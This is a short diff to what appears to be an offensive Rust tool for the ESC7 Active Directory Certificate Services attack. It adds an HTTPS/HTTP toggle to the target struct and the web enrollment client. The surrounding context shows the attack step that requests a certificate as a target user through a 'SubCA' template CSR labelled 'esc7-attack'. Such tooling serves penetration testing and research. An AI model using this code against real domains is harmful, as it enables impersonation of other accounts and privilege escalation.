@@ -29,6 +29,8 @@ pub struct Esc7Target {
     pub domain: String,
     /// current user field
     pub current_user: String,
+    /// Whether to use HTTPS (true) or HTTP (false)
+    pub use_ssl: bool,
 }
 
 impl Esc7Target {
@@ -39,11 +41,23 @@ impl Esc7Target {
         domain: impl Into<String>,
         current_user: impl Into<String>,
     ) -> Self {
+        Self::with_ssl(ca_name, ca_server, domain, current_user, true)
+    }
+
+    /// Create a new ESC7 target with explicit SSL choice.
+    pub fn with_ssl(
+        ca_name: impl Into<String>,
+        ca_server: impl Into<String>,
+        domain: impl Into<String>,
+        current_user: impl Into<String>,
+        use_ssl: bool,
+    ) -> Self {
         Self {
             ca_name: ca_name.into(),
             ca_server: ca_server.into(),
             domain: domain.into(),
             current_user: current_user.into(),
+            use_ssl,
         }
     }
 
@@ -84,7 +98,7 @@ impl Esc7Target {
 
         // Step 3: Request certificate via Web Enrollment (will be pending)
         info!("ESC7 Step 3: Requesting certificate as {}", target_upn);
-        let web_client = WebEnrollmentClient::new(&self.ca_server)?;
+        let web_client = WebEnrollmentClient::with_ssl(&self.ca_server, self.use_ssl)?;
 
         let (csr_der, private_key) = create_esc1_csr("esc7-attack", target_upn, "SubCA")?;
 
